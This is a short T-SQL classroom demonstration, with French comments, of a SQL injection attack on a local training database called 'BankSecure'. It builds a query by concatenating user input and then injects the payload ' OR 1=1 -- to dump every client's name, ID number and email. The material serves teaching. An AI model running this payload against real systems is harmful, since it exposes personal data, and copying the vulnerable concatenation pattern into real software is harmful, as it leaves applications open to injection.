
-- Professeur : Ali KARTIT
-- DEMO 3 : SQL INJECTION - ATTAQUE
-- Environnement local BankSecure uniquement

USE BankSecure;
GO

-- ETAPE 1 : Entree normale de l'utilisateur

DECLARE @email NVARCHAR(150) =
    N'yassine.elamrani@example.com';

DECLARE @cin NVARCHAR(20) =
    N'AB123456';

-- ETAPE 2 : Construction vulnerable de la requete
-- PROBLEME : concatenation directe des entrees utilisateur

DECLARE @sql NVARCHAR(MAX);

SET @sql =
    N'SELECT id, nom, CIN, email
      FROM dbo.Clients
      WHERE email = N''' + @email +
      N''' AND CIN = N''' + @cin + N''';';

PRINT N'Requete SQL generee :';
PRINT @sql;

-- ETAPE 3 : Execution de la requete vulnerable

EXEC (@sql);
GO

-- ETAPE 4 : Simulation de l'attaque
-- Payload : ' OR 1=1 --

DECLARE @email_attaquant NVARCHAR(150) =
    N''' OR 1=1 --';

DECLARE @cin_attaquant NVARCHAR(20) =
    N'AB123456';

DECLARE @sql_attaque NVARCHAR(MAX);

SET @sql_attaque =
    N'SELECT id, nom, CIN, email
      FROM dbo.Clients
      WHERE email = N''' + @email_attaquant +
      N''' AND CIN = N''' + @cin_attaquant + N''';';

PRINT N'Requete apres injection :';
PRINT @sql_attaque;

-- Execution de l'attaque

EXEC (@sql_attaque);

SELECT N'Professeur : Ali KARTIT' AS Trace;
GO
